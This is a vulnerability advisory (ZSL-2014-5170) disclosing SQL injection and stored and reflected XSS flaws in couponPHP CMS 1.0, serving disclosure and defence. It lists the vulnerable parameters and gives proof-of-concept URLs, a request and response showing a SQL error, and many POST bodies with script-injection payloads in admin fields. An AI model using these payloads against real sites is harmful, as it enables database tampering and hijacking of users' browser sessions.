@@ -1,0 +1,128 @@
+couponPHP CMS 1.0 Multiple Stored XSS and SQL Injection Vulnerabilities
+
+
+Vendor: couponPHP
+Product web page: http://www.couponphp.com
+Affected version: 1.0
+
+Summary: couponPHP is a revolutionary content management system
+for running Coupon and Deal websites. It is feature rich, powerful,
+beautifully designed and fully automatic.
+
+Desc: couponPHP is vulnerable to multiple Stored XSS and SQL Injection issues.
+Input passed via the parameters 'iDisplayLength' and 'iDisplayStart' in
+'comments_paginate.php' and 'stores_paginate.php' scripts are not properly
+sanitised before being returned to the user or used in SQL queries. This can
+be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+The parameter 'sEcho' in 'comments_paginate.php' and 'stores_paginate.php' and the
+parameters 'affiliate_url', 'description', 'domain', 'seo[description]', 'seo[heading]',
+'seo[title]', 'seo[keywords]', 'setting[logo]', 'setting[perpage]' and 'setting[sitename]'
+in '/admin/index.php' script are vulnerable to stored XSS issues where the attacker
+can execute arbitrary HTML and script code in a user's browser session in context
+of an affected site.
+
+
+Tested on: Apache/2.2.14(Ubuntu)
+           PHP/5.3.2-1ubuntu4.14
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2014-5170
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5170.php
+
+
+01.02.2014
+
+--
+
+
+SQL Injections:
+----------------
+
+http://localhost/admin/ajax/comments_paginate.php?sEcho=1&iColumns=7&sColumns=&iDisplayStart=0[SQL Inject]&iDisplayLength=250[SQL Inject]
+http://localhost/admin/ajax/stores_paginate.php?sEcho=1&iColumns=12&sColumns=&iDisplayStart=0[SQL Inject]&iDisplayLength=250[SQL Inject]
+
+
+Full Request/Response Sample:
+------------------------------
+
+GET /admin/ajax/stores_paginate.php?sEcho=1&iColumns=12&sColumns=&iDisplayStart=0&iDisplayLength=250'&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&mDataProp_7=7&mDataProp_8=8&mDataProp_9=9&mDataProp_10=10&mDataProp_11=11&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&sSearch_7=&bRegex_7=false&bSearchable_7=true&sSearch_8=&bRegex_8=false&bSearchable_8=true&sSearch_9=&bRegex_9=false&bSearchable_9=true&sSearch_10=&bRegex_10=false&bSearchable_10=true&sSearch_11=&bRegex_11=false&bSearchable_11=true&iSortingCols=0&bSortable_0=false&bSortable_1=false&bSortable_2=true&bSortable_3=true&bSortable_4=false&bSortable_5=true&bSortable_6=true&bSortable_7=true&bSortable_8=true&bSortable_9=true&bSortable_10=false&bSortable_11=false HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/admin/index.php?menu=stores_manage
+Cookie: [removed]
+Connection: keep-alive
+
+
+HTTP/1.1 200 OK
+Date: Sun, 02 Feb 2014 17:27:42 GMT
+Server: Apache/2.2.14 (Ubuntu)
+X-Powered-By: PHP/5.3.2-1ubuntu4.14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 153
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 #277
+
+-----------------------
+
+
+
+Reflected and Persistent XSS:
+------------------------------
+
+http://localhost/admin/ajax/comments_paginate.php?sEcho=1"><script>alert(1);</script> (Reflected, GET)
+http://localhost/admin/ajax/stores_paginate.php?sEcho=1"><script>alert(1);</script> (Reflected, GET)
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane&description=kakodane2&affiliate_url=kakodane"><script>alert(1)</script>&seo%5Btitle%5D=&seo%5Bkeywords%5D=&seo%5Bdescription%5D=&seo%5Bheading%5D=&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane&description=kakodane<script>alert(1)</script>&affiliate_url=kakodane3&seo%5Btitle%5D=&seo%5Bkeywords%5D=&seo%5Bdescription%5D=&seo%5Bheading%5D=&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane"><script>alert(1)</script>&description=kakodane2&affiliate_url=kakodane3&seo%5Btitle%5D=&seo%5Bkeywords%5D=&seo%5Bdescription%5D=&seo%5Bheading%5D=&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane&description=kakodane2&affiliate_url=kakodane3&seo%5Btitle%5D=&seo%5Bkeywords%5D=&seo%5Bdescription%5D=<script>alert(1)</script>&seo%5Bheading%5D=&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane&description=kakodane2&affiliate_url=kakodane3&seo%5Btitle%5D=&seo%5Bkeywords%5D=&seo%5Bdescription%5D=&seo%5Bheading%5D="><script>alert(1);</script>&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane&description=kakodane2&affiliate_url=kakodane3&seo%5Btitle%5D=&seo%5Bkeywords%5D="><script>alert(1)</script>&seo%5Bdescription%5D=&seo%5Bheading%5D=&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- thumbnail=store_8f08c534d509e7dd8a19906a0c0622a5.jpg&title=Testing101&domain=kakodane&description=kakodane2&affiliate_url=kakodane3&seo%5Btitle%5D="><script>alert(1)</script>&seo%5Bkeywords%5D=&seo%5Bdescription%5D=&seo%5Bheading%5D=&categories%5B%5D=3&categories%5B%5D=17&categories%5B%5D=35&categories%5B%5D=47&menu=stores_new&add_store=Add+store
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- setting%5Bsitename%5D=couponPHP"><script>alert(1)</script>&setting%5Blogo%5D=logo_e3c61f6eb1039f2b1f02301a7635b7af.jpg&setting%5Bperpage%5D=50&setting%5Ballow_submit%5D=on&menu=settings_general&setting_name=site&tab=1&save_setting=Save
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- setting%5Bsitename%5D=couponPHP&setting%5Blogo%5D=logo_e3c61f6eb1039f2b1f02301a7635b7af.jpg&setting%5Bperpage%5D=50"><script>alert(1)</script>&setting%5Ballow_submit%5D=on&menu=settings_general&setting_name=site&tab=1&save_setting=Save
+
+
+http://localhost/admin/index.php (Persistent, POST)
+- setting%5Bsitename%5D=couponPHP&setting%5Blogo%5D=logo_e3c61f6eb1039f2b1f02301a7635b7af.jpg"><script>alert(1)</script>&setting%5Bperpage%5D=50&setting%5Ballow_submit%5D=on&menu=settings_general&setting_name=site&tab=1&save_setting=Save
